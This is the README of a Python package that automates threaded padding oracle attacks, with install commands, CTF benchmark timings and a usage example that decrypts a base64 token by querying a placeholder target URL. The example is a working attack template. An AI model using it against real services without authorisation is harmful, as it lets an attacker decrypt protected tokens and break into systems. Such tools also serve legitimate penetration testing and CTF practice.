# padding_oracle.py

Fast threaded [padding oracle](https://en.wikipedia.org/wiki/Padding_oracle_attack) attack automation script for Python 3.

## Install

PyPI:

```shell
pip3 install -U padding_oracle
```

GitHub:

```shell
pip3 install -U git+https://github.com/djosix/padding_oracle.py.git
```

## Performance

Tested on [0x09] Cathub Party from EDU-CTF:

| Request Threads | Execution Time |
|-----------------|----------------|
| 1               | 17m 43s        |
| 4               | 5m 23s         |
| 16              | 1m 20s         |
| 64              | 56s            |

## Usage

Let's say we are going to test `https://the.target.site/api/?token=BASE64_ENCODED_TOKEN`

```python
from padding_oracle import padding_oracle, base64_encode, base64_decode
import requests, string

sess = requests.Session() # for connection pool
url = 'https://the.target.site/api/'

def check_decrypt(cipher: bytes):
    resp = sess.get(url, params={'token': base64_encode(cipher)})

    if 'failed' in resp.text:
        return False
    elif 'success' in resp.text:
        return True
    else:
        raise RuntimeError('unexpected behavior')

cipher = base64_decode('BASE64_ENCODED_TOKEN')
# becomes IV + block1 + block2 + ...
assert len(cipher) % 16 == 0

plaintext = padding_oracle(
    cipher, # cipher bytes
    block_size = 16,
    oracle = check_decrypt,
    num_threads = 16,
    chars = string.printable # possible plaintext chars
)
```

This package also provides PHP-like encoding/decoding functions:

```python
from padding_oracle.encoding import (
    urlencode,
    urldecode,
    base64_encode,
    base64_decode,
)
```

## License

This project is licensed under the terms of the MIT license.

<!-- PiuPiuPiu -->
